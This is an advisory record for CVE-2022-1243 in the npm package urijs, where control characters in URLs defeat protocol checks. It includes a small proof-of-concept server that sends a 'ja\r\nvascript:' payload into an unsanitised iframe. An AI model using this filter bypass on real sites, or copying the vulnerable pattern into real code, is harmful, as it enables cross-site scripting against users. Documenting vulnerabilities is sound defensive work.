advisory_id: GHSA-3vjf-82ff-p4r3
datasource_id: github_osv_importer_v2/GHSA-3vjf-82ff-p4r3
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/04/GHSA-3vjf-82ff-p4r3/GHSA-3vjf-82ff-p4r3.json
aliases:
  - CVE-2022-1243
summary: |
  Incorrect protocol extraction via \r, \n and \t characters
  \r, \n and \t characters in user-input URLs can potentially lead to incorrect protocol extraction when using npm package urijs prior to version 1.19.11.

  This can lead to XSS when the module is used to prevent passing in malicious javascript: links into HTML or Javascript (see following example):
  ````
  const parse = require('urijs')
  const express = require('express')
  const app = express()
  const port = 3000

  input = "ja\r\nvascript:alert(1)"
  url = parse(input)

  console.log(url)

  app.get('/', (req, res) => {
   if (url.protocol !== "javascript:") {res.send("<iframe src=\'" + input + "\'>CLICK ME!</iframe>")}
  })

  app.listen(port, () => {
   console.log(`Example app listening on port ${port}`)
  })
  ````
impacted_packages:
  - purl: pkg:npm/urijs
    affected_versions: vers:npm/<1.19.11
    fixed_versions: vers:npm/1.19.11
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.2'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/04/GHSA-3vjf-82ff-p4r3/GHSA-3vjf-82ff-p4r3.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-20
references:
  - url: https://github.com/medialize/uri.js
    reference_type:
    reference_id:
  - url: https://github.com/medialize/uri.js/commit/b0c9796aa1a95a85f40924fb18b1e5da3dc8ffae
    reference_type:
    reference_id:
  - url: https://huntr.dev/bounties/8c5afc47-1553-4eba-a98e-024e4cc3dfb7
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-1243
    reference_type:
    reference_id: CVE-2022-1243
